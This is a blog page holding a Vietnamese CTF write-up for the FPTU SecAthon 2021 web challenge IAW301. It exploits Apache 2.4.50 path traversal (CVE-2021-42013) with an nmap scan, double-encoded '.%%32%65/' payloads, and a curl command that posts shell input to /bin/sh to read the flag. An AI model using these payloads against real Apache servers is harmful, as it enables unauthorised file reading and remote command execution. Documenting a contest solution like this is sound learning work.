<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>phucdc's Blog</title>
<link
    rel="stylesheet"
    href="/assets/css/styles.css"
/>



<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
<link rel="mask-icon" href="/assets/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">



<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<link
  rel="stylesheet"
  href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 bg-dark vh-100 sticky-top sidebar text-center">
    <div class="avatar">
        <img id="avatar" src="/assets/avatar.png" class="rounded-circle" alt="">
    </div> <br>
    <h3 class="text-white text-center">phucdc's Blog</h3>
    <hr class="text-white">
    <div class="nav">
        <ul>
            
           <li class="nav-item">
                <a href="/"><i class="bi bi-house"></i>Home</a>
           </li> 
           
           <li class="nav-item">
                <a href="/about/"><i class="bi bi-info-square"></i>About</a>
           </li> 
           
        </ul>
    </div>
    <div class="nav contact">
        <ul>
            
            <li class="nav-item">
                <a href="https://github.com/phucdc-noob">
                    <i class="bi bi-github"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://twitter.com/PhucdcN">
                    <i class="bi bi-twitter"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="https://www.facebook.com/phuc.duongcong5545/">
                    <i class="bi bi-facebook"></i>
                </a>
            </li>
            
            <li class="nav-item">
                <a href="mailto:phucbontu1012@gmail.com">
                    <i class="bi bi-envelope"></i>
                </a>
            </li>
            
        </ul>
    </div>
</div>


    

            <div class="main col-md-8" id="main">
                <div class="post" id="post">
    <h1>FPTU SecAthon 2021 | Web Writeup | IAW301</h1>
    <span>Oct 09, 21</span>
    <hr>
    <div id="post-content"><h1 id="iaw301">IAW301</h1>

<blockquote>
  <p>Đây là một challenge dễ, nhưng thật tiếc vì mình lú nên đã gõ sai một kí tự trong payload mà không biết :’(
Xin úp mặt vào tường để tự kiểm điểm :’(</p>
</blockquote>

<ul>
  <li>Bắt đầu với challenge, ta được cung cấp 2 dữ liệu, file httpd.conf, và gợi ý về flag:</li>
</ul>

<p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_1.png" alt="hints" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">httpd.conf</code> là file config của Apache Server, truy cập vào file theo đường dẫn, mình nhận thấy có một số thứ hay ho:</li>
</ul>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Directory "/usr/local/apache2/cgi-bin"&gt;
    AllowOverride None
    Options None
    Require all granted
&lt;/Directory&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Trong thời gian gần đây, có 2 CVE nổi tiếng liên quan đến 2 phiên bản của Apache và <code class="language-plaintext highlighter-rouge">cgi-bin</code> của nó, đó là <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a> (Apache 2.4.49) và <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013">CVE-2021-42013</a> (Apache 2.4.50), đặc điểm chung là lỗi trong việc normalize path ở file <code class="language-plaintext highlighter-rouge">util.c</code> khiến tin tặc có thể sử dụng <code class="language-plaintext highlighter-rouge">path traversal</code> với payload thường thấy là <code class="language-plaintext highlighter-rouge">/cgi-bin/../../../etc.passwd</code>, nhưng, vì <code class="language-plaintext highlighter-rouge">util.c</code> đã check dấu <code class="language-plaintext highlighter-rouge">.</code> khi normalize path, nên chúng ta sẽ cần dùng tới những payload được encode như <code class="language-plaintext highlighter-rouge">/.%2e/</code> thay cho <code class="language-plaintext highlighter-rouge">/../</code>.</p>
  </li>
  <li>
    <p>Tất nhiên, giữa 2 CVE kể trên có sự khác nhau trong payload, vì vậy chúng ta cần check xem Apache đó thuộc phiên bản nào (nếu &gt; 2.4.50 thì kiếp này coi như bỏ :’()</p>
  </li>
  <li>
    <p>Mình thử check với câu lệnh <code class="language-plaintext highlighter-rouge">nmap</code> đơn giản sau:</p>

    <p><code class="language-plaintext highlighter-rouge">nmap -A -p8889 139.180.208.121 -vvv</code></p>

    <p>Và có được kết quả:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  PORT     STATE SERVICE REASON  VERSION
  8889/tcp open  http    syn-ack Apache httpd 2.4.50 <span class="o">((</span>Unix<span class="o">))</span>
  | http-methods: 
  |   Supported Methods: HEAD GET POST OPTIONS TRACE
  |_  Potentially risky methods: TRACE
  |_http-title: Site doesn<span class="s1">'t have a title (text/html).
  |_http-server-header: Apache/2.4.50 (Unix)
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Như vậy là Apache 2.4.50, ta có thể dùng <code class="language-plaintext highlighter-rouge">%%32%65%%32%65/</code> hoặc <code class="language-plaintext highlighter-rouge">.%%32%65/</code> thay thế cho <code class="language-plaintext highlighter-rouge">../</code></p>
  </li>
  <li>
    <p>Có một lưu ý là khi đọc <code class="language-plaintext highlighter-rouge">httpd.conf</code>, hãy để ý đến dòng <code class="language-plaintext highlighter-rouge">ScriptAlias</code> để biết liệu có alias nào thay cho <code class="language-plaintext highlighter-rouge">cgi-bin</code> không, ví dụ như trong bài này:</p>

    <p><code class="language-plaintext highlighter-rouge">ScriptAlias /nothingspecial/ "/usr/local/apache2/cgi-bin/"</code></p>
  </li>
  <li>
    <p>Và để ý <code class="language-plaintext highlighter-rouge">DocumentRoot</code> như trong bài:</p>

    <p><code class="language-plaintext highlighter-rouge">DocumentRoot "/usr/local/apache2/htdocs"</code></p>
  </li>
  <li>
    <p>Như vậy để truy cập được <code class="language-plaintext highlighter-rouge">/</code> thì ta cần 4 cặp <code class="language-plaintext highlighter-rouge">../</code>, thay thế alias và 2 cách encode đã kể trên, ta có payload:</p>

    <p><code class="language-plaintext highlighter-rouge">/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag</code></p>
  </li>
  <li>
    <p>Nhưng, như vậy liệu có đúng? Thử với <code class="language-plaintext highlighter-rouge">curl</code> và đây là kết quả:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_2.png" alt="IAW301_2" /></p>
  </li>
  <li>
    <p>Thực tế có một cách khác, ta sẽ dùng đến <code class="language-plaintext highlighter-rouge">/bin/sh</code> và option <code class="language-plaintext highlighter-rouge">--data</code> của <code class="language-plaintext highlighter-rouge">curl</code> để mở file, đơn giản như sau:</p>

    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="s1">'http://139.180.208.121:8889/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'</span> <span class="nt">--data</span> <span class="s1">'echo; cat ../flag'</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Và đây là kết quả:</p>

    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/762f1031aac218fa44bc2100116170a9e6fe8dbc/img/IAW301_1.png" alt="IAW301_3" /></p>
  </li>
  <li>
    <p>Flag: <code class="language-plaintext highlighter-rouge">FUSEC{970c5c12bc41fd2783748e73fccf99b0}</code></p>
  </li>
</ul>

<blockquote>
  <p>Xin lỗi cả team noname vì mỡ đến miệng rồi mà để tuột mất vì một dấu % thừa :’(</p>
</blockquote>
</div>
</div>
<script>
    var imgEl = document.getElementsByTagName('img');
    for (var i=0; i<imgEl.length; i++) {
        if (imgEl[i].getAttribute('src') && imgEl[i].id != 'avatar') {
        imgEl[i].setAttribute('data-src',imgEl[i].getAttribute('src'));
        imgEl[i].removeAttribute('src'); //use only if you need to remove data-src attribute after setting src
        }
    }
    $(function() {

        const IMG_SCOPE = '.main .post';
      
        if ($(`${IMG_SCOPE} img`).length <= 0 ) {
          return;
        }
      
        /* lazy loading */
      
        const imgList = document.querySelectorAll(`${IMG_SCOPE} img[data-src]`);
        const observer = lozad(imgList);
        observer.observe();
      
        /* popup */
      
        $(`${IMG_SCOPE} p > img[data-src],${IMG_SCOPE} img[data-src].preview-img`).each(
          function() {
            let nextTag = $(this).next();
            const title = nextTag.prop('tagName') === 'EM' ? nextTag.text() : '';
            const src = $(this).attr('data-src'); // created by lozad.js
      
            $(this).wrap(`<a href="${src}" title="${title}" class="popup"></a>`);
          }
        );
      
        $('.popup').magnificPopup({
          type: 'image',
          closeOnContentClick: true,
          showCloseBtn: false,
          zoom: {
            enabled: true,
            duration: 300,
            easing: 'ease-in-out'
          }
        });
      
        /* markup the image links */
      
        $(`${IMG_SCOPE} a`).has('img').addClass('img-link');
      
      });
</script>
            </div>
            



        </div>
    </div>
    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [['$','$'], ['\\(','\\)']],
            processEscapes: true
          }
        });
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
</body>
</html>


